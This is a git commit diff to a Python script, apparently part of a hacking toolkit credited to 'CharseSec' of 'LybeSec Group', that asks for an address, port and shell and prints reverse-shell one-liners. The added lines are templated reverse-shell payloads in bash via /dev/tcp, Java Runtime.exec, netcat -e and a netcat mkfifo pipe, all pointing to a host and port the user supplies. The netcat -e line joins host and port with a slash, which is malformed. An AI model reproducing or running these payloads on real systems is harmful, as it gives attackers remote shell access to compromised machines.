158d66d51d71d848087822bce22b9fff2006bf97
Ch4rse da 404 <107947345+Ch4rse404@users.noreply.github.com>
2023-04-09 04:33:50 -0300

    Atualizar o tek2.py

--- modulos/tek2.py
+++ modulos/tek2.py
@@ -15,11 +15,36 @@ print("""
 
             \033[1;37;41mCodded By: CharseSec\033[0m - \033[1;37;41mLybeSec Group\033[0m""")
 
+ext = input("\033[1;37;41mQUAL ENDERECO? >>\033[0m")
+port = input("\033[1;37;41mDIGITE A PORTA >>\033[0m")
+
+print("\033[97m╔══════════════════════════════════════════════╗")
+print("")
+print(""" \033[1;49;35m[ x ] \033[4;49;96m/bin/sh\033[0m
+
+ \033[1;49;35m[ x ] \033[4;49;96m/bin/bash\033[0m
+
+ \033[1;49;35m[ x ] \033[4;49;96m/bin/zsh\033[0m
+
+ \033[1;49;35m[ x ] \033[4;49;96m/bin/ksh\033[0m
+
+ \033[1;49;35m[ x ] \033[4;49;96m/bin/tcsh\033[0m
+
+ \033[1;49;35m[ x ] \033[4;49;96m/bin/dash\033[0m""")
+print("")
+print("\033[97m╚══════════════════════════════════════════════╝ ")
+
+shell = input("\033[1;37;41mDIGITE A SHELL COMO OS EXEMPLOS ACIMA >>\033[0m")
+
 print("\033[97m╔══════════════════════════════════════════════╗")
 print("")
 print(f""" \033[1;49;35m[ + ] \033[4;49;96mBASH\033[0m
+bash -i >& /dev/tcp/{ext}/{port} 0>&1
 
  \033[1;49;35m[ + ] \033[4;49;96mJAVA\033[0m
+r = Runtime.getRuntime()
+p = r.exec(["{shell}","-c","exec 5<>/dev/tcp/{ext}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
 
  \033[1;49;35m[ + ] \033[4;49;96mPERL\033[0m
 
@@ -28,8 +53,10 @@ print(f""" \033[1;49;35m[ + ] \033[4;49;96mBASH\033[0m
  \033[1;49;35m[ + ] \033[4;49;96mPHP\033[0m
 
  \033[1;49;35m[ + ] \033[4;49;96mNC-PLAIN\033[0m
+nc -e {shell} {ext}/{port}
 
  \033[1;49;35m[ + ] \033[4;49;96mNC-MKFIFO\033[0m
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ext} {port} >/tmp/f
 
  \033[1;49;35m[ + ] \033[4;49;96mRUBY\033[0m
 
